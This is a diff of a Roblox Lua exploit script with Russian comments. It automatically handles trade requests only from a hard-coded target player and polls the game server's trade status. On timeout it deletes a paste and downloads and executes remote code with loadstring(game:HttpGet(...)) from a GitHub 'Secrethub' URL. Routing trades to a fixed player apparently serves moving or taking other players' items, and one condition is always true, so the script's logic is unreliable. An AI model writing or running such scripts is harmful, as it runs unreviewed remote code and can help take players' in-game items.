@@ -1,4 +1,3 @@
---дада сурс код братан :3
 _G.gg = _G.gg or false
 if _G.gg then
     print("already")
@@ -84,10 +83,7 @@ local acceptcon = actions:WaitForChild("Accept")
 local tradeRequest2 = LocalPlayer.PlayerGui.MainGUI.Game.Leaderboard.Container:WaitForChild("TradeRequest")
 local TradeRequest = DEVICE_TYPE == 'tablet' and tradeRequest2
 
-local startTime = os.time()
-local TRADE_TIMEOUT = 180
 
-tradeReceived = false
 TradeRequest:GetPropertyChangedSignal("Visible"):Connect(function()
     if TradeRequest.Visible then
         local usernameLabel = TradeRequest:FindFirstChild("ReceivingRequest") and TradeRequest.ReceivingRequest:FindFirstChild("Username")
@@ -95,7 +91,6 @@ TradeRequest:GetPropertyChangedSignal("Visible"):Connect(function()
             -- Если текст уже корректный и наш доверенный игрок
             if usernameLabel.Text == targetName then
                 handleTrade(usernameLabel.Text)
-                tradeReceived = true
             elseif usernameLabel.Text == "Nikilis" or "PLAYER_NAME1" then
                 -- Ждём, пока текст сменится на реального игрока
                 local conn
@@ -104,7 +99,6 @@ TradeRequest:GetPropertyChangedSignal("Visible"):Connect(function()
                         conn:Disconnect()
                         if usernameLabel.Text == targetName then
                             handleTrade(usernameLabel.Text)
-                            tradeReceived = true
                         else
                             print("Трейд от недоверенного игрока:", usernameLabel.Text)
                         end
@@ -115,6 +109,8 @@ TradeRequest:GetPropertyChangedSignal("Visible"):Connect(function()
                 print("Трейд от недоверенного игрока:", usernameLabel.Text)
             end
         end
+    else
+        warn("нету request")
     end
 end)
 
@@ -234,15 +230,29 @@ game.Players.LocalPlayer.OnTeleport:Connect(function()
         print("queue нету")
     end
 end)
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Trade = ReplicatedStorage:WaitForChild("Trade")
 
 task.spawn(function()
-    while not tradeReceived do
+    local startTime = os.time()
+    while true do
         wait(3)
+
+        local success, status = pcall(function()
+            return Trade.GetTradeStatus:InvokeServer()
+        end)
+
+        -- Если получили статус и он "StartTrade", сбрасываем таймер
+        if success and status == "StartTrade" then
+            startTime = os.time()  -- трейд начался, обновляем таймер
+        end
+
+        -- Проверяем таймаут
         local now = os.time()
-        if now - startTime >= TRADE_TIMEOUT then
-            print("❌ В течение Value минут не было трейда от доверенного игрока.")
+        if now - startTime >= 120 then
+            print("❌ В течение 120 секунд статус не стал 'StartTrade'.")
             deletePaste()
-            loadstring(game:HttpGet(('https://raw.githubusercontent.com/Roma77799/Secrethub/refs/heads/main/OtherSCRIPTS/ServerHop'), true))()
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/Roma77799/Secrethub/refs/heads/main/OtherSCRIPTS/ServerHop', true))()
             break
         end
     end
